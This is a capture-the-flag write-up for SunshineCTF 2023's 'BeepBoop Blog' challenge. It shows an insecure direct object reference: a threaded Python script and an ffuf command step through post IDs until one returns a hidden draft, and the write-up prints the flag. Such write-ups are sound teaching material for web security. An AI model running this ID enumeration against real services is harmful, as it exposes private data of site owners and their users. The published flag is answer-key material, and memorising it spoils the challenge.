# BeepBoop Blog

## Description

> A few robots got together and started a blog! It's full of posts that make absolutely no sense, but a little birdie told me that one of them left a secret in their drafts. Can you find it?
>
> <https://beepboop.web.2023.sunshinectf.games>

## Flag

sun{wh00ps_4ll_IDOR}

## Solution

Requesting blog post by specifying ID (e.g. `/post/1/`), there is hidden field in response json.

```console
root@kali:~/ctf/SunshineCTF_2023/scripting/SimonProgrammer 1# curl -sk https://beepboop.web.2023.sunshinectf.games/post/1/ | jq
{
  "hidden": false,
  "post": "(snip)",
  "user": "Robot #911"
}
```

So I retrieve all blog posts with `/post/:id/` and output a response which has `"hidden": true`.

solver.py

```python
from concurrent.futures import ThreadPoolExecutor

import requests

requests.packages.urllib3.disable_warnings()

s = requests.Session()
# s.proxies = {"https": "http://127.0.0.1:8080"}


def pwn(i: int):
    resp = s.get(f"https://beepboop.web.2023.sunshinectf.games/post/{i}/", verify=False)
    resp = resp.json()
    if resp["hidden"] == True:
        print(i)
        print(resp)
        exit(0)


with ThreadPoolExecutor(max_workers=100) as executor:
    for i in range(1, 1024):
        executor.submit(pwn, i)
```

```console
root@kali:~/ctf/SunshineCTF_2023/Web/BeepBoop_Blog# python3 solver.py
608
{'hidden': True, 'post': 'sun{wh00ps_4ll_IDOR}', 'user': 'Robot #000'}
```

Fuzzing tools, such as [ffuf/ffuf](https://github.com/ffuf/ffuf), is also useful.

```console
root@kali:~/ctf/SunshineCTF_2023/Web/BeepBoop_Blog# seq 1 1024 > ids.txt

root@kali:~/ctf/SunshineCTF_2023/Web/BeepBoop_Blog# ffuf -u https://beepboop.web.2023.sunshinectf.games/post/FUZZ/ -w ids.txt -mr '"hidden":true'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://beepboop.web.2023.sunshinectf.games/post/FUZZ/
 :: Wordlist         : FUZZ: /root/ctf/SunshineCTF_2023/Web/BeepBoop_Blog/ids.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: "hidden":true
________________________________________________

608                     [Status: 200, Size: 66, Words: 2, Lines: 2, Duration: 202ms]
:: Progress: [1024/1024] :: Job [1/1] :: 240 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

root@kali:~/ctf/SunshineCTF_2023/Web/BeepBoop_Blog# curl -sk https://beepboop.web.2023.sunshinectf.games/post/608/
{"hidden":true,"post":"sun{wh00ps_4ll_IDOR}","user":"Robot #000"}
```
